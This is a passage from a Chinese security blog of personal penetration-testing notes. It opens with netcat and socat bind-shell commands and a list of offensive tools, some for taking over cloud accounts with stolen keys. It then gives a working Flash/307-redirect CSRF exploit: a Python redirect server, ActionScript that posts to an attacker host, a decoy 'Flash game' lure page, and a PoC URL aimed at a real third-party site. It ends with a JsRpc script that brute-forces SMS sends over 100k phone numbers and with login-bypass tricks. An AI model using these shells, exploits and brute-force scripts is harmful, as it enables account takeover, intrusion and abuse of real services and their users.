<p>​	nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i 2&gt;&amp;1”		&#x2F;&#x2F;全回显，2&gt;&amp;1 表示将 标准错误（stderr） 重定向到 标准输出（stdout），确保错误信息也能回显。</p>
<table>
<thead>
<tr>
<th align="left">需求</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">简单回显（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;/bin/bash -i 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">完整终端支持（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;script -q -c &#39;/bin/bash -i&#39; /dev/null 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">最佳兼容性（<code>socat</code>）</td>
<td align="left"><code>socat TCP-LISTEN:8080,reuseaddr,fork EXEC:&quot;/bin/bash -i&quot;,pty,stderr</code></td>
</tr>
</tbody></table>
<h5 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找 nc 进程</span></span><br><span class="line">ps aux | grep &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接用 pkill 终止所有 nc 进程</span></span><br><span class="line">pkill -f &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死进程（假设进程ID是 12345）</span></span><br><span class="line">kill 12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者强制杀死</span></span><br><span class="line">kill -9 12345</span><br></pre></td></tr></table></figure>



<h3 id="ls"><a href="#ls" class="headerlink" title="ls:"></a>ls:</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看异常连接</span></span><br><span class="line">netstat <span class="literal">-ano</span> | grep <span class="string">&#x27;:8080&#x27;</span></span><br><span class="line">ss <span class="literal">-tulnp</span> | grep <span class="string">&#x27;:8080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看端口占用</span></span><br><span class="line">lsof <span class="literal">-i</span> :<span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">步骤</th>
<th align="left">命令</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1. 查找占用 8080 的 PID</td>
<td align="left">&#96;sudo ss -tulnp</td>
<td align="left">grep ‘:8080’<code>或</code>sudo lsof -i :8080&#96;</td>
</tr>
<tr>
<td align="left">2. 定位可执行文件</td>
<td align="left"><code>sudo ls -l /proc/&lt;PID&gt;/exe</code> 或 <code>sudo readlink -f /proc/&lt;PID&gt;/exe</code></td>
<td align="left">找到程序的真实路径</td>
</tr>
<tr>
<td align="left">3. 检查工作目录</td>
<td align="left"><code>sudo ls -l /proc/&lt;PID&gt;/cwd</code></td>
<td align="left">查看程序运行时的工作目录</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>computer</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具&amp;项目推荐</title>
    <url>/2025/04/23/%E9%A1%B9%E7%9B%AE&amp;%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<p><strong>看目录查找，内容未制表</strong></p>
<span id="more"></span>

<h1 id="GitHub项目"><a href="#GitHub项目" class="headerlink" title="GitHub项目"></a>GitHub项目</h1><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件"><a href="#bp插件" class="headerlink" title="bp插件"></a>bp插件</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->

<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h6 id="cf"><a href="#cf" class="headerlink" title="cf"></a><a href="https://github.com/teamssix/cf/releases">cf</a></h6><h1 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h1><h5 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h5><h6 id="openvpn—统一网"><a href="#openvpn—统一网" class="headerlink" title="openvpn—统一网"></a>openvpn—统一网</h6><h6 id="SocksCap645—管理-强制代理"><a href="#SocksCap645—管理-强制代理" class="headerlink" title="SocksCap645—管理&amp;强制代理"></a>SocksCap645—管理&amp;强制代理</h6><h6 id="Proxifier—强制代理"><a href="#Proxifier—强制代理" class="headerlink" title="Proxifier—强制代理"></a>Proxifier—强制代理</h6><h6 id="Fiddler-Classic—强制代理【渗透工具】"><a href="#Fiddler-Classic—强制代理【渗透工具】" class="headerlink" title="Fiddler Classic—强制代理【渗透工具】"></a>Fiddler Classic—强制代理【渗透工具】</h6><h6 id="Charles—强制代理【渗透工具】"><a href="#Charles—强制代理【渗透工具】" class="headerlink" title="Charles—强制代理【渗透工具】"></a>Charles—强制代理【渗透工具】</h6><h6 id="burpsuite—【专业渗透工具】"><a href="#burpsuite—【专业渗透工具】" class="headerlink" title="burpsuite—【专业渗透工具】"></a>burpsuite—【专业渗透工具】</h6><h1 id="框架工具推荐"><a href="#框架工具推荐" class="headerlink" title="框架工具推荐"></a>框架工具推荐</h1><h5 id="spring-boot框架"><a href="#spring-boot框架" class="headerlink" title="spring-boot框架"></a>spring-boot框架</h5><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6><h6 id="swagger-hack"><a href="#swagger-hack" class="headerlink" title="swagger-hack"></a><a href="https://github.com/jayus0821/swagger-hack">swagger-hack</a></h6><h5 id="thinkphp框架"><a href="#thinkphp框架" class="headerlink" title="thinkphp框架"></a>thinkphp框架</h5><h5 id="Weblogic框架"><a href="#Weblogic框架" class="headerlink" title="Weblogic框架"></a>Weblogic框架</h5><h5 id="nacos框架"><a href="#nacos框架" class="headerlink" title="nacos框架"></a>nacos框架</h5>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF记录</title>
    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
<p>get+post_forms</p>
<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
<p>2-中等</p>
<p>限定type，例如最典型的：post-json</p>
<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
<p>3-安全</p>
<p>安全，以目前技术没希望的，或者只能</p>
<p>钓鱼、xss、cors等联合漏洞实现的</p>
<hr>
<span id="more"></span>

<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
<p>利用难点：	打开网址A的时候打开网址B</p>
<p>​			若是网址接收option也可以直接用js操作</p>
<p>​			服务器对发送种类限制，例如：json</p>
<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
<p>*注意：需要用户浏览器启用 Flash</p>
<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>



<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
<p>..&#x2F;_code&#x2F;csrf</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
      </tags>
  </entry>
  <entry>
    <title>指南针-导航</title>
    <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
<p>后端：<a href="">步行规划</a></p>
<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>获取磁场传感器、加速度传感器，得到方向角。打开app的一瞬间以手机方向为arrow_image.png的指向角度</p>
<p>偏转角度：</p>
<p>定位指向真北的角度+正北顺时针到目标经纬度的角度</p>
<p>以定位更改为刷新	&#x2F;&#x2F;	以每2s为更新次数</p>
<p>难点：</p>
<p>对Android Studio完全陌生，即便更改别人的指南针项目也一定时间无法搞懂其项目结构，对java的不熟悉更是难以下脚</p>
<p>语音的接入以及服务器发包和接包这几个功能点的嵌入无从动手</p>
<p>做法：</p>
<p>先更改其ui来熟悉项目结构</p>
<p>新增功能点，只要接入角度的偏转就行</p>
<span id="more"></span>

<h2 id="内容更改"><a href="#内容更改" class="headerlink" title="内容更改"></a>内容更改</h2><p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\CompassFragment.kt<br>—&gt;updateCompass</p>
<p>\Downloads\Compass-master\Compass-master\app\src\main\res\layout\compass_view.xml<br>@+id&#x2F;cardinal_direction_north_text—–北</p>
<p>\Compass-master\Compass-master\app\src\main\res\values-zh\strings.xml</p>
<p>更改参考文字</p>
<p>###########需要更改<br>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\view\CompassView.kt<br>R.string.degrees—动态更改距离</p>
<p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\model\Azimuth.kt<br>val degrees—偏转角度</p>
<h6 id="方向角的计算公式："><a href="#方向角的计算公式：" class="headerlink" title="方向角的计算公式："></a>方向角的计算公式：</h6><p><img src="/..%5Cimage%5Cmap-app%5Cazimuth.png" alt="azimuth"></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>前端游走</title>
    <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
    <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
<p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
<h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
<h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
<span id="more"></span>

<p>连接–&gt;<a href="https://github.com/cliayn/cliayn.github.io/blob/master/image/web-js-freely/1.txt">连接函数</a>，断点自己找明文就行</p>
<p><img src="/../image/web-js-freely/1.png" alt="该图取自先知社区"></p>
<p>全局变量如下，例如加密函数a(t)，t是明码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.enc=a</span><br><span class="line">//如果复杂则用下面的</span><br><span class="line"></span><br><span class="line">window.enc=function()&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>设置demo变量如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;);</span><br></pre></td></tr></table></figure>

<p>设置demo变量的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve, param) &#123;</span><br><span class="line">    var res = enc(String(param));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里是传多个参数</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve,param) &#123;</span><br><span class="line">    //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span><br><span class="line">    res=hlg(param[&quot;user&quot;],param[&quot;status&quot;])</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>运行js到断点处执行所有的代码和指令，例如设置全局变量一定要在断点处，否则可能会找不到明码变量</strong></p>
<h3 id="3-跑py代码"><a href="#3-跑py代码" class="headerlink" title="[3]跑py代码"></a>[3]跑py代码</h3><p>py代码框架大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//例如我爆破手机号</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">file_path = &#x27;sampled_100k.txt&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            print(line.strip())  # .strip() to remove any extra newline characters</span><br><span class="line">            phone_number = line.strip()</span><br><span class="line">            </span><br><span class="line">            url = f&quot;http://127.0.0.1:12080/go?group=zzz&amp;action=sendSms&amp;param=&#123;phone_number&#125;&quot;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f&quot;File &#123;file_path&#125; not found.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>你定义的window.enc函数的功能决定res.text返回的是什么</strong></p>
<h1 id="前端穿梭"><a href="#前端穿梭" class="headerlink" title="前端穿梭"></a>前端穿梭</h1><p>如果你因为进入不了后台而找不全接口，或者渗透时js老是强制跳转登录页面，这个可能能帮到你</p>
<h3 id="1-绕过登录口"><a href="#1-绕过登录口" class="headerlink" title="[1]绕过登录口"></a>[1]绕过登录口</h3><p>提供几个方法以供参考，如果不行还是得审计js文件</p>
<h5 id="·1-更改响应包"><a href="#·1-更改响应包" class="headerlink" title="·1.更改响应包"></a>·1.更改响应包</h5><p>更改登录接口返回的响应包，将flase改成true，或者code改成200或者0，status改成200或者0，具体数字可能需要审计js代码，看他们js监控的登录成功的响应是什么，一般情况就是200或者0</p>
<h5 id="·2-控制台强制跳转"><a href="#·2-控制台强制跳转" class="headerlink" title="·2.控制台强制跳转"></a>·2.控制台强制跳转</h5><p>这个比较万金油，在控制台输入如下指令，如果用不了你就得看js文件—看下方注意事项</p>
